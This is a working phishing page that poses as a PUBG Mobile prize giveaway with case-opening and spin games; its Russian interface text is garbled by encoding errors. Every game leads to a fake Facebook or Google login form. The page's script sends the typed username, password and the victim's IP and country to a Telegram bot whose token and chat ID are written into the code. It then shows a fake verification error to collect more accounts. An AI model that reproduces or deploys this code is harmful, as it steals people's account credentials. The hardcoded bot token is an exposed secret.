<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG Mobile - Giveaway</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        :root {
            --pubg-gold: #ffbc00;
            --pubg-gold-dark: #cc9600;
            --pubg-dark: #0b0c0d;
            --pubg-blue: #0084ff;
        }

        body {
            background-image: url('IMG_1807.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0; padding: 0;
            overflow-x: hidden;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            background-color: #000;
        }

        /* --- –ü–†–ï–õ–û–ê–î–ï–† --- */
        #preloader {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: #0b0c0d;
            background-image: url('IMG_1807.png');
            background-size: cover;
            background-position: center;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease;
        }

        .loader-box {
            background: rgba(13, 15, 19, 0.9);
            padding: 30px 40px;
            border-radius: 15px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .spinner-snake {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ffffff; 
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* --- HEADER --- */
        header {
            background: rgba(0, 0, 0, 0.9);
            padding: 0 12px;
            display: flex;            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            position: sticky; top: 0; z-index: 100;
            height: 65px;
        }

        .header-left {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            width: 30%;
        }

        /* –°—Ç–∏–ª—å –ª–æ–≥–æ—Ç–∏–ø–∞ */
        .main-logo {
            height: 38px;
            width: auto;
            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
        }

        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        .balance-display {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 4px 10px;
            display: flex;
            align-items: center;
            gap: 4px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .uc-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #1a1a1a;
            border: 1px solid #c4a162;
            border-radius: 4px;
            padding: 1px 4px;
            font-size: 10px;
            font-weight: 900;
            color: #fff;
        }

        /* --- GAMES --- */
        .case-container {
            position: relative;
            width: 100%; height: 180px;
            overflow: hidden;
            margin: 20px 0;
        }

        .case-line {
            position: absolute;
            top: 0; left: 50%;
            width: 2px; height: 100%;
            background: var(--pubg-gold);
            z-index: 20;
            box-shadow: 0 0 15px var(--pubg-gold);
            transform: translateX(-50%);
        }

        .case-tape {
            display: flex;
            padding: 30px 0;
            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
            will-change: transform;
        }

        .case-item {
            min-width: 140px;
            width: 140px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .case-item img { width: 100px; height: 100px; object-fit: contain; }

        .btn-blue {
            background: var(--pubg-blue);
            color: white;
            width: calc(100% - 32px);
            margin: 0 16px;
            padding: 16px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            text-align: center;
            cursor: pointer;
        }

        .nav-bar {
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #000; height: 65px;
            display: flex; justify-content: space-around; align-items: center;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            z-index: 50;
        }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
        .nav-item.active { color: var(--pubg-gold); }

        .modal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 1000; display: none; flex-direction: column; padding: 20px;
            justify-content: center;
        }
        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>

    <main id="section-hub" class="p-4">
        <div class="grid grid-cols-2 gap-4 mt-4">
            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">

            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">

    <!-- –°–ï–ö–¶–ò–Ø –°–ü–ò–ù–ê -->

        <div class="text-center py-4">
            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
        </div>
        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
            <div class="grid grid-cols-3 gap-3">
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>

            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>

    <div id="modalForm" class="modal">

            <input type="text" id="inpUser" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω">
            <input type="password" id="inpPass" placeholder="–ü–∞—Ä–æ–ª—å">
            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">–í–æ–π—Ç–∏</button>
        </div>
    </div>

    <nav class="nav-bar">
        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
        <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
    </nav>

    <script>
        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
        const CHAT_ID = '1709490182';
        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
        
        let balance = 60; 
        let isSpinning = false;
        let userIP = '';
        const itemWidth = 140;

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')').catch(e => userIP = 'unknown');

        function showSection(id) {
            if (isSpinning) return;
            document.getElementById('section-hub').style.display = 'none';
            document.getElementById('section-case').style.display = 'none';
            document.getElementById('section-spin').style.display = 'none';
            document.getElementById('section-' + id).style.display = 'block';

            if (id === 'hub') {
                document.getElementById('backBtn').style.display = 'none';
                document.getElementById('headerLogo').style.display = 'block';
            } else {
                document.getElementById('backBtn').style.display = 'flex';
                document.getElementById('headerLogo').style.display = 'none';
            }

            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
        }

        function initCase() {
            const tape = document.getElementById('caseTape');
            tape.innerHTML = '';
            for(let i=0; i<60; i++) {
                let idx = Math.floor(Math.random() * prizeImages.length);
                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
            }
        }

        function openCase() {
            if (balance < 60 || isSpinning) return;
            balance -= 60; document.getElementById('headerBalance').innerText = balance;
            isSpinning = true;
            const tape = document.getElementById('caseTape');
            const screenCenter = window.innerWidth / 2;
            const finalOffset = (40 * itemWidth) - screenCenter + (itemWidth / 2);
            tape.style.transform = `translateX(-${finalOffset}px)`;
            setTimeout(() => {
                isSpinning = false;
                startAuth();
            }, 5000);
        }

        function startSpin() {
            if (isSpinning || balance < 60) return;
            balance -= 60; document.getElementById('headerBalance').innerText = balance;
            isSpinning = true;
            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
            let step = 0;
            const totalSteps = 20 + Math.floor(Math.random() * 10);
            const interval = setInterval(() => {
                cells.forEach(id => document.getElementById(id).style.borderColor = 'transparent');
                document.getElementById(cells[step % cells.length]).style.borderColor = '#ffbc00';
                step++;
                if (step >= totalSteps) {
                    clearInterval(interval);
                    setTimeout(() => { isSpinning = false; startAuth(); }, 500);
                }
            }, 150);
        }

        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
        function openForm(m) {
            document.getElementById('modalAuth').style.display = 'none';
            document.getElementById('modalForm').style.display = 'flex';
            document.getElementById('methodName').innerText = m;
        }

        async function finalSubmit() {
            const u = document.getElementById('inpUser').value;
            const p = document.getElementById('inpPass').value;
            if(u.length < 3 || p.length < 3) return alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: `üî• LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`})
            });
            alert('–û—à–∏–±–∫–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π –∞–∫–∫–∞—É–Ω—Ç.');
            location.reload();
        }

        window.onload = () => {
            initCase();
            setTimeout(() => {
                const loader = document.getElementById('preloader');
                loader.style.opacity = '0';
                setTimeout(() => loader.style.display = 'none', 500);
            }, 1500);
        };
    </script>
